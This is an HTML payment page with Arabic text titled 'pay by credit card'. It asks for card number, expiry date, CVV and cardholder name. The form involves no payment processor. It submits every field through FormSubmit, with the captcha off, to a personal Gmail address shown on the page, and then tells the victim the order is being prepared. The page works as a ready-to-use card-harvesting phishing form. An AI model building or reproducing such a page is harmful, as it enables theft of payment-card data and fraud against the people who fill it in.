<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج الدفع الإلكتروني</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .payment-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px;
            padding: 25px;
        }
        
        .payment-title {
            font-size: 22px;
            color: #333;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 600;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            border-color: #4a86e8;
            outline: none;
            box-shadow: 0 0 0 2px rgba(74, 134, 232, 0.2);
        }
        
        .row {
            display: flex;
            gap: 15px;
        }
        
        .col {
            flex: 1;
        }
        
        .pay-button {
            background-color: #4a86e8;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 15px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }
        
        .pay-button:hover {
            background-color: #3b76d9;
        }
        
        .card-icons {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 5px;
        }
        
        .card-icon {
            width: 40px;
            height: 24px;
            background-color: #f0f0f0;
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #777;
        }
        
        .notification {
            display: none;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            text-align: center;
            border-radius: 6px;
            margin-top: 15px;
        }
        
        .email-confirmation {
            background-color: #e8f4ff;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: #2c3e50;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <h1 class="payment-title">ادفع بواسطة البطاقة الإئتمانية</h1>
        
        <!-- تم تحديث البريد الإلكتروني إلى ahmadalaali03@gmail.com -->
        <form action="https://formsubmit.co/ahmadalaali03@gmail.com" method="POST">
            <!-- إعدادات FormSubmit -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_subject" value="طلب دفع جديد من العميل">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_next" value="?success=true">
            
            <div class="input-group">
                <label for="cardNumber">رقم البطاقة</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="أدخل رقم البطاقة" maxlength="19" required>
                <div class="card-icons">
                    <div class="card-icon">VISA</div>
                    <div class="card-icon">MC</div>
                    <div class="card-icon">MADA</div>
                </div>
            </div>
            
            <div class="row">
                <div class="col">
                    <div class="input-group">
                        <label for="expiryDate">تاريخ الانتهاء</label>
                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
                    </div>
                </div>
                <div class="col">
                    <div class="input-group">
                        <label for="cvv">CVV/CVC</label>
                        <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required>
                    </div>
                </div>
            </div>
            
            <div class="input-group">
                <label for="cardName">اسم صاحب البطاقة</label>
                <input type="text" id="cardName" name="cardName" placeholder="الاسم كما هو مدون على البطاقة" required>
            </div>
            
            <button type="submit" class="pay-button">دفع</button>
            
            <div class="notification" id="successMessage">
                تم إرسال بيانات الدفع بنجاح، سيتم التجهيز لطلبك قريباً.
            </div>
        </form>
        
        <div class="email-confirmation">
            <p>سيتم إرسال بيانات النموذج إلى: <strong>ahmadalaali03@gmail.com</strong></p>
        </div>
    </div>

    <script>
        // دالة لإضافة مسافات بين أرقام البطاقة
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = '';
            
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue;
        });
        
        // دالة لتنسيق تاريخ الانتهاء
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,2}', 'g')).join('/');
            }
            
            e.target.value = value;
        });
        
        // منع إدخال أي شيء غير أرقام في CVV
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        
        // عرض رسالة النجاح بعد الإرسال
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('success')) {
            document.getElementById('successMessage').style.display = 'block';
        }
    </script>
</body>
</html>
